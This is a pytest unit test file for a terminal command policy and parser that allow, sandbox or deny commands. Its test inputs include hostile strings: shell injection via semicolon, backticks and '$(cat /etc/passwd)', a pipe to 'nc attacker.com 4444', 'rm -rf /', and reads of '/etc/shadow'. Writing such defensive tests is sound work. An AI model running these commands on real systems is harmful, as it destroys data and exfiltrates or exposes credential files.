"""
Unit tests — Command policy enforcement.
"""

from __future__ import annotations

import pytest

from app.capabilities.offline.terminal.command_policy import CommandDecision, CommandPolicy
from app.capabilities.offline.terminal.command_parser import CommandParser
from app.core.exceptions import CommandDeniedError


@pytest.fixture
def policy():
    return CommandPolicy()


@pytest.fixture
def parser():
    return CommandParser()


class TestCommandPolicy:
    def test_allows_pwd(self, policy):
        decision, reason = policy.evaluate("pwd", [])
        assert decision == CommandDecision.ALLOW_RESTRICTED

    def test_allows_ls(self, policy):
        decision, reason = policy.evaluate("ls", ["-la"])
        assert decision == CommandDecision.ALLOW_RESTRICTED

    def test_allows_grep(self, policy):
        decision, reason = policy.evaluate("grep", ["pattern", "file.txt"])
        assert decision == CommandDecision.ALLOW_RESTRICTED

    def test_sandbox_only_python(self, policy):
        decision, reason = policy.evaluate("python", ["script.py"])
        assert decision == CommandDecision.SANDBOX_ONLY

    def test_sandbox_only_node(self, policy):
        decision, reason = policy.evaluate("node", ["app.js"])
        assert decision == CommandDecision.SANDBOX_ONLY

    def test_denies_rm(self, policy):
        decision, reason = policy.evaluate("rm", ["-rf", "/workspace"])
        assert decision == CommandDecision.DENY

    def test_denies_sudo(self, policy):
        decision, reason = policy.evaluate("sudo", ["bash"])
        assert decision == CommandDecision.DENY

    def test_denies_chmod(self, policy):
        decision, reason = policy.evaluate("chmod", ["777", "/etc/passwd"])
        assert decision == CommandDecision.DENY

    def test_denies_shutdown(self, policy):
        decision, reason = policy.evaluate("shutdown", ["-h", "now"])
        assert decision == CommandDecision.DENY

    def test_denies_unknown_executable(self, policy):
        decision, reason = policy.evaluate("malicious_tool", [])
        assert decision == CommandDecision.DENY

    def test_denies_shell_injection_semicolon(self, policy):
        decision, reason = policy.evaluate("ls", ["; rm -rf /"])
        assert decision == CommandDecision.DENY

    def test_denies_shell_injection_pipe(self, policy):
        decision, reason = policy.evaluate("cat", ["file.txt | nc attacker.com 4444"])
        assert decision == CommandDecision.DENY

    def test_denies_shell_injection_backtick(self, policy):
        decision, reason = policy.evaluate("echo", ["`whoami`"])
        assert decision == CommandDecision.DENY

    def test_denies_shell_injection_dollar_paren(self, policy):
        decision, reason = policy.evaluate("echo", ["$(cat /etc/passwd)"])
        assert decision == CommandDecision.DENY

    def test_denies_blocked_arg_pattern(self, policy):
        decision, reason = policy.evaluate("ls", ["/etc/shadow"])
        assert decision == CommandDecision.DENY

    def test_denies_privileged_flag(self, policy):
        decision, reason = policy.evaluate("python", ["--privileged", "script.py"])
        assert decision == CommandDecision.DENY

    def test_denies_docker_in_executable(self, policy):
        decision, reason = policy.evaluate("docker", ["run", "ubuntu"])
        assert decision == CommandDecision.DENY


class TestCommandParser:
    def test_valid_command(self, parser):
        # Should not raise
        parser.validate("python", ["script.py"], "/workspace")

    def test_rejects_empty_executable(self, parser):
        with pytest.raises(CommandDeniedError):
            parser.validate("", [], "/workspace")

    def test_rejects_null_byte_in_executable(self, parser):
        with pytest.raises(CommandDeniedError):
            parser.validate("python\x00", [], "/workspace")

    def test_rejects_null_byte_in_argument(self, parser):
        with pytest.raises(CommandDeniedError):
            parser.validate("ls", ["file\x00.txt"], "/workspace")

    def test_rejects_too_many_arguments(self, parser):
        args = ["arg"] * 100
        with pytest.raises(CommandDeniedError, match="Too many"):
            parser.validate("ls", args, "/workspace")

    def test_rejects_suspicious_unicode_in_executable(self, parser):
        with pytest.raises(CommandDeniedError, match="Unicode"):
            parser.validate("python\u202e", [], "/workspace")
